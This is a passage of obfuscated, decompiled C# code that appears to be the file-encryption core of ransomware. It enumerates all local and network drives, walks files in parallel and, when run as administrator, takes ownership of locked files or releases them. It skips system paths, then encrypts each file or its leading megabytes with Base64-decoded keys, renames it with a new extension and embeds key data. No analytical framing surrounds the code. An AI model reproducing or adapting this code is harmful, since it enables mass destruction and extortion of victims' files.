		CS_0024_003C_003E8__locals0.NcuKpGJnmmL = string_2;
		CS_0024_003C_003E8__locals0.inbNUQoaoLp = string_3;
		CS_0024_003C_003E8__locals0.IBbAAFpKOswdk = string_4;
		if (WUcQpnUgejkJqpB && !eXbSvlDLJLqL().Contains(getString_0(107349600)))
		{
			wRATPVNQGKWWa.aBfxypLUvpfe();
		}
		LkftepqeXsefTk = Convert.FromBase64String(CS_0024_003C_003E8__locals0.inbNUQoaoLp);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395911))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = uqJAzDRcogCLtJ(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !nVFBdVszaoh.Contains(text))
							{
								nVFBdVszaoh.Add(text);
							}
							else if (!nVFBdVszaoh.Contains(array[i].Name))
							{
								nVFBdVszaoh.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!nVFBdVszaoh.Contains(array[i].Name))
							{
								nVFBdVszaoh.Add(array[i].Name);
							}
						}
					}
					else if (!nVFBdVszaoh.Contains(array[i].Name))
					{
						nVFBdVszaoh.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!nVFBdVszaoh.Contains(string_0[j]))
				{
					nVFBdVszaoh.Add(string_0[j]);
				}
			}
		}
		if (nVFBdVszaoh.Contains(gUlAYNDfQee(getString_0(107349469))) && NvaHMnBuwoxAC == getString_0(107396883))
		{
			nVFBdVszaoh.Remove(gUlAYNDfQee(getString_0(107349469)));
		}
		Parallel.ForEach(nVFBdVszaoh, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new aqfJbcykYejZmwL.CgHgUAKNLwPjI();
			CS_0024_003C_003E8__locals0.jqsVSiuWHs = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.kaNVvzwzDsJ = string_0;
			if (hkbsCfPIIfG && !eXbSvlDLJLqL().Contains(aqfJbcykYejZmwL.getString_0(107349610)) && !eXbSvlDLJLqL().Contains(aqfJbcykYejZmwL.getString_0(107365739)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						XVacNoFQjahs(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.kaNVvzwzDsJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (pPfoNHLnIlcgVkwJ == aqfJbcykYejZmwL.getString_0(107396893))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					IUcmtFtUFChzRCv(CS_0024_003C_003E8__locals0.kaNVvzwzDsJ, CS_0024_003C_003E8__locals0.jqsVSiuWHs.UCbzoZncBa, CS_0024_003C_003E8__locals0.jqsVSiuWHs.IBbAAFpKOswdk, CS_0024_003C_003E8__locals0.jqsVSiuWHs.NcuKpGJnmmL, CS_0024_003C_003E8__locals0.jqsVSiuWHs.inbNUQoaoLp);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				IUcmtFtUFChzRCv(CS_0024_003C_003E8__locals0.kaNVvzwzDsJ, CS_0024_003C_003E8__locals0.UCbzoZncBa, CS_0024_003C_003E8__locals0.IBbAAFpKOswdk, CS_0024_003C_003E8__locals0.NcuKpGJnmmL, CS_0024_003C_003E8__locals0.inbNUQoaoLp);
			}
		});
	}

	public static void IUcmtFtUFChzRCv(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107352529));
		List<string> list3 = list2;
		if (NipEhbZTuUcU == getString_0(107396993))
		{
			if (KExMLRsuNJD == getString_0(107396883) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && vUROAKAZQOddDee(string_0))
			{
				FQTtzLCDJJQAk fQTtzLCDJJQAk = null;
				try
				{
					fQTtzLCDJJQAk = new FQTtzLCDJJQAk(string_0.Replace(getString_0(107396805), getString_0(107352529)));
				}
				catch
				{
					list = HxzdYPjHQaGDIWDw(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					kKpggOgSXc(fQTtzLCDJJQAk.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = HxzdYPjHQaGDIWDw(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = HxzdYPjHQaGDIWDw(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = fWVUPvpddLsRB.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0453;
					}
				}
				if ((YpMnpCDdWH == getString_0(107396993) && !item.EndsWith(text)) || aAbwlpshQJNC.Contains(item))
				{
					continue;
				}
				if (kdgdQzLhNzqB == getString_0(107396883))
				{
					try
					{
						if (mnpRWvvbrJgHv.cJzqbOCqGLtS(item))
						{
							mnpRWvvbrJgHv.WtlWQnLheONJif(item);
						}
					}
					catch
					{
					}
				}
				aAbwlpshQJNC.Add(item);
				if (!AknjtLUSQgBf.Contains(Path.GetDirectoryName(item)))
				{
					AknjtLUSQgBf.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (dHRyeOBeWtyqJR == getString_0(107396883) && fileStream.Length > Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024 && !list3.Contains(text))
					{
						if (ttlCPfUMAnPPn == getString_0(107396883))
						{
							foreach (string item2 in RpGcCAInLIz)
							{
								if (item.ToLower().EndsWith(item2) && ymVKGiHEgE == getString_0(107396883))
								{
									if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && ymVKGiHEgE == getString_0(107396993))
								{
									try
									{
										mYaTrXhnsaDz.jPGIJOflxVN(getString_0(107352642), getString_0(107352605), getString_0(107352592), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = kkKbYndBNVRIq.IVisBGGKLwj(item, Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024);
						byte[] fWbWouVUtQb = kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						kkKbYndBNVRIq.cOUmRprntfS(item, fWbWouVUtQb);
						if (string_2 != getString_0(107349460))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107349460))
					{
						YvrEgPECnvyZYScBi(item, item + string_2, LkftepqeXsefTk);
					}
					else
					{
						YvrEgPECnvyZYScBi(item, item + getString_0(107349455), LkftepqeXsefTk);
					}
				}
				catch (Exception)
				{
				}
				IL_0453:;
			}
		}
	}

	public static void kKpggOgSXc(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		rMKsTJZgha.yNAeEToLAJLz CS_0024_003C_003E8__locals0 = new rMKsTJZgha();
		CS_0024_003C_003E8__locals0.irMLgePJDX = list_0;
		CS_0024_003C_003E8__locals0.QxykwlAceQFylEg = string_1;
		CS_0024_003C_003E8__locals0.boaEQxNXtIuKCtPO = string_2;
		CS_0024_003C_003E8__locals0.MKXSGZQsex = string_3;
		CS_0024_003C_003E8__locals0.QtmvuwZlumLl = new List<string> { getString_0(107352529) };
		if (YpMnpCDdWH == getString_0(107396993))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.irMLgePJDX.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					rMKsTJZgha.WpJNwmODutnr CS_0024_003C_003E8__locals1 = new rMKsTJZgha.WpJNwmODutnr();
					CS_0024_003C_003E8__locals1.aXSAfIkYbfct = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.DTaZlHbaazgUn = enumerator2.Current;
					if (!CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107352003)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351978)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351945)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351960)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351403)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351410)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351389)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351344)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351331)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351326)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351317)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351268)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351242)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351253)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351228)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351179)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351194)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351657)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351672)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351623)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351638)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351589)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351608)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351555)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351574)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351529)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351544)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.ToLower().Contains(rMKsTJZgha.getString_0(107351495)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(gUlAYNDfQee(rMKsTJZgha.getString_0(107351510))) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351485)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107397151)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107351440)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(CS_0024_003C_003E8__locals0.QxykwlAceQFylEg) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107351447)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107351442)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107350893)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(rMKsTJZgha.getString_0(107350888)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(rMKsTJZgha.getString_0(107350883)) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(tBpNkaUiwdaB) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(kZGwVMpcMFQGdu) && !CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.Contains(BVDNRoTnEzf))
					{
						if (CS_0024_003C_003E8__locals0.boaEQxNXtIuKCtPO.Length != 0)
						{
							string[] boaEQxNXtIuKCtPO2 = CS_0024_003C_003E8__locals0.boaEQxNXtIuKCtPO;
							int num2 = 0;
							while (num2 < boaEQxNXtIuKCtPO2.Length)
							{
								string value2 = boaEQxNXtIuKCtPO2[num2];
								if (!CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_1119;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(CS_0024_003C_003E8__locals0.QxykwlAceQFylEg))
							{
								goto IL_1119;
							}
						}
						catch (Exception)
						{
							goto IL_1119;
						}
						if (CS_0024_003C_003E8__locals1.DTaZlHbaazgUn.EndsWith(string_0) && !aAbwlpshQJNC.Contains(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn))
						{
							if (kdgdQzLhNzqB == rMKsTJZgha.getString_0(107396901))
							{
								try
								{
									if (mnpRWvvbrJgHv.cJzqbOCqGLtS(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn))
									{
										mnpRWvvbrJgHv.WtlWQnLheONJif(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
									}
								}
								catch
								{
								}
							}
							aAbwlpshQJNC.Add(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (sHBjpbgVmkra)
									{
										Console.WriteLine(rMKsTJZgha.WpJNwmODutnr.getString_0(107365795) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.WpJNwmODutnr.getString_0(107365692) + new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length + rMKsTJZgha.WpJNwmODutnr.getString_0(107365639));
										Console.WriteLine(rMKsTJZgha.WpJNwmODutnr.getString_0(107365226), aAbwlpshQJNC.Count, iRDeCsZxbW, YZVmksVDGrCDMh);
										Console.WriteLine(rMKsTJZgha.WpJNwmODutnr.getString_0(107365169), zTfquIuAKrE.Elapsed);
										Console.WriteLine(rMKsTJZgha.WpJNwmODutnr.getString_0(107365662));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!AknjtLUSQgBf.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn)))
							{
								AknjtLUSQgBf.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn));
							}
							bHpvAtayIadi(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
							try
							{
								new OAxPYfdUYtB().kBVxeUnZtOC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (sHBjpbgVmkra)
										{
											Console.WriteLine(rMKsTJZgha.getString_0(107365702) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365689) + new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length + rMKsTJZgha.getString_0(107365636));
											Console.WriteLine(rMKsTJZgha.getString_0(107365659));
										}
									}
									catch
									{
									}
									pPOxzMkmHSA(gUlAYNDfQee(rMKsTJZgha.getString_0(107365554)), rMKsTJZgha.getString_0(107350799) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107350799) + gUlAYNDfQee(rMKsTJZgha.getString_0(107365529)) + rMKsTJZgha.getString_0(107350799) + Environment.UserName + rMKsTJZgha.getString_0(107350799) + gUlAYNDfQee(rMKsTJZgha.getString_0(107365992)));
								}
							}
							catch (Exception ex18)
							{
								if (IOdNTzsqoZWVAC)
								{
									try
									{
										File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365967) + ex18.Message + rMKsTJZgha.getString_0(107396673));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length != 0L)
									{
										goto end_IL_08ba;
									}
									goto end_IL_08ba_2;
									end_IL_08ba:;
								}
								catch (Exception ex20)
								{
									if (IOdNTzsqoZWVAC)
									{
										try
										{
											File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365918) + ex20.Message + rMKsTJZgha.getString_0(107396673));
										}
										catch (Exception)
										{
										}
									}
									YZVmksVDGrCDMh++;
									goto end_IL_08ba_2;
								}
								if (!(dHRyeOBeWtyqJR == rMKsTJZgha.getString_0(107396901)) || new FileInfo(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn).Length <= Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024 || CS_0024_003C_003E8__locals0.QtmvuwZlumLl.Contains(string_0))
								{
									if (gmYGIhcbzDElW)
									{
										CS_0024_003C_003E8__locals0.QxykwlAceQFylEg = lEGlvoOLHlud + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg;
									}
									string text5 = lOiJKLXYNaE.EUcJjWziQBK(32);
									string text6 = rMKsTJZgha.getString_0(107352547);
									text6 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : rMKsTJZgha.getString_0(107352547));
									string s3 = jHvXcQAocngrZWa.UXBKErjXJpX(text5 + text6);
									byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
									if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
									{
										if (!XRrWKEvMyEJKuU)
										{
											if (!JsBIHINLdKrOq)
											{
												rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, LkftepqeXsefTk);
											}
											else
											{
												rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, Convert.FromBase64String(text5));
											}
										}
										else
										{
											try
											{
												if (!JsBIHINLdKrOq)
												{
													GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
												}
												else
												{
													GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
												}
											}
											catch (Exception ex22)
											{
												if (IOdNTzsqoZWVAC)
												{
													try
													{
														File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349496) + ex22.Message + rMKsTJZgha.getString_0(107396673));
													}
													catch (Exception)
													{
													}
												}
												YZVmksVDGrCDMh++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
												}
												catch (Exception)
												{
												}
												goto end_IL_08ba_2;
											}
										}
									}
									else if (!XRrWKEvMyEJKuU)
									{
										if (!JsBIHINLdKrOq)
										{
											rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349473), LkftepqeXsefTk);
										}
										else
										{
											rVYEpwebTUtQK(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349473), Convert.FromBase64String(text5));
										}
									}
									else
									{
										try
										{
											if (!JsBIHINLdKrOq)
											{
												GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, LkftepqeXsefTk, Convert.FromBase64String(tHaxFjXwOLKb));
											}
											else
											{
												GiEPJrlkxkyBC(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, Convert.FromBase64String(text5), Convert.FromBase64String(text6));
											}
										}
										catch (Exception ex25)
										{
											if (IOdNTzsqoZWVAC)
											{
												try
												{
													File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107349496) + ex25.Message + rMKsTJZgha.getString_0(107396673));
												}
												catch (Exception)
												{
												}
											}
											YZVmksVDGrCDMh++;
											goto end_IL_08ba_2;
										}
									}
									if (JsBIHINLdKrOq)
									{
										if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
										{
											LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, bytes3);
										}
										else
										{
											LoqGoLvZhSEzLPF(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, bytes3);
										}
									}
									goto IL_1119;
								}
								CS_0024_003C_003E8__locals0 = new rMKsTJZgha.ocqbuZDEbXSyG();
								CS_0024_003C_003E8__locals0.xmJqGZaQzny = CS_0024_003C_003E8__locals1;
								CS_0024_003C_003E8__locals0.aXSAfIkYbfct = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
									{
										if (gmYGIhcbzDElW)
										{
											CS_0024_003C_003E8__locals0.QxykwlAceQFylEg = lEGlvoOLHlud + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg;
										}
										File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg);
									}
								}
								catch (Exception ex27)
								{
									if (IOdNTzsqoZWVAC)
									{
										try
										{
											File.AppendAllText(kZGwVMpcMFQGdu, rMKsTJZgha.getString_0(107349240) + CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + rMKsTJZgha.getString_0(107365825) + ex27.Message + rMKsTJZgha.getString_0(107396673));
										}
										catch (Exception)
										{
										}
									}
									YZVmksVDGrCDMh++;
									goto end_IL_08ba_2;
								}
								CS_0024_003C_003E8__locals0.sAdHiECMzxLH = rMKsTJZgha.getString_0(107352547);
								if (CS_0024_003C_003E8__locals0.QxykwlAceQFylEg != rMKsTJZgha.getString_0(107349478))
								{
									CS_0024_003C_003E8__locals0.sAdHiECMzxLH = CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg;
								}
								else
								{
									CS_0024_003C_003E8__locals0.sAdHiECMzxLH = CS_0024_003C_003E8__locals1.DTaZlHbaazgUn;
								}
								if (ttlCPfUMAnPPn == rMKsTJZgha.getString_0(107396901))
								{
									Thread thread4 = new Thread((ThreadStart)delegate
									{
										foreach (string item in RpGcCAInLIz)
										{
											if (CS_0024_003C_003E8__locals0.sAdHiECMzxLH.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.aXSAfIkYbfct.QxykwlAceQFylEg) && ymVKGiHEgE == rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107396908))
											{
												if (Convert.ToInt32(MJsJJqYMMt) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.sAdHiECMzxLH).Length)
												{
													try
													{
														mYaTrXhnsaDz.jPGIJOflxVN(rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107352667), rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107352630), rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107352617), CS_0024_003C_003E8__locals0.sAdHiECMzxLH);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.sAdHiECMzxLH.ToLower().EndsWith(item) && ymVKGiHEgE == rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107397018))
											{
												try
												{
													mYaTrXhnsaDz.jPGIJOflxVN(rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107352667), rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107352630), rMKsTJZgha.ocqbuZDEbXSyG.getString_0(107352617), CS_0024_003C_003E8__locals0.sAdHiECMzxLH);
												}
												catch
												{
												}
											}
										}
									});
									thread4.Priority = ThreadPriority.Normal;
									thread4.IsBackground = false;
									thread4.Start();
								}
								string text7 = lOiJKLXYNaE.EUcJjWziQBK(32);
								string text8 = rMKsTJZgha.getString_0(107352547);
								text8 = (JsBIHINLdKrOq ? lOiJKLXYNaE.sKpHBCLYxr() : rMKsTJZgha.getString_0(107352547));
								string s4 = jHvXcQAocngrZWa.UXBKErjXJpX(text7 + text8);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (fRCrnusObo == rMKsTJZgha.getString_0(107397011))
								{
									byte[] array2 = null;
									byte[] byte_2 = kkKbYndBNVRIq.IVisBGGKLwj(CS_0024_003C_003E8__locals0.sAdHiECMzxLH, Convert.ToInt32(XaBojWlRQDbFIzp) * 1024 * 1024);
									if (kkKbYndBNVRIq.cOUmRprntfS(fWbWouVUtQb: (!ZdrpEPuTKVdNM) ? (JsBIHINLdKrOq ? kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_2, Convert.FromBase64String(text7), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : kkKbYndBNVRIq.ZhgCAqtDUPafD(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MKXSGZQsex), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (JsBIHINLdKrOq ? ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_2, Convert.FromBase64String(text7), Convert.FromBase64String(text8)) : ljGMsJUyXoVokMGC.ktwhezfiBVAUNLi(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MKXSGZQsex), Convert.FromBase64String(tHaxFjXwOLKb))), mMkGcFwOyALFJP: CS_0024_003C_003E8__locals0.sAdHiECMzxLH, wNHkPJFScGyAC: bytes4))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
									}
									catch (Exception)
									{
									}
								}
								else if (!JsBIHINLdKrOq)
								{
									if (EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.sAdHiECMzxLH, XaBojWlRQDbFIzp, CS_0024_003C_003E8__locals0.MKXSGZQsex, null, Convert.FromBase64String(tHaxFjXwOLKb)))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (EBBCbHTQPFk.RLENGbvKOVkQ(CS_0024_003C_003E8__locals0.sAdHiECMzxLH, XaBojWlRQDbFIzp, text7, bytes4, Convert.FromBase64String(text8)))
									{
										goto IL_1119;
									}
									try
									{
										File.Move(CS_0024_003C_003E8__locals1.DTaZlHbaazgUn + CS_0024_003C_003E8__locals0.QxykwlAceQFylEg, CS_0024_003C_003E8__locals1.DTaZlHbaazgUn);
									}
									catch (Exception)
									{
									}
								}
								end_IL_08ba_2:;
							}
							catch (Exception)
							{
								goto IL_1119;
							}
						}
					}
					continue;
					IL_1119:
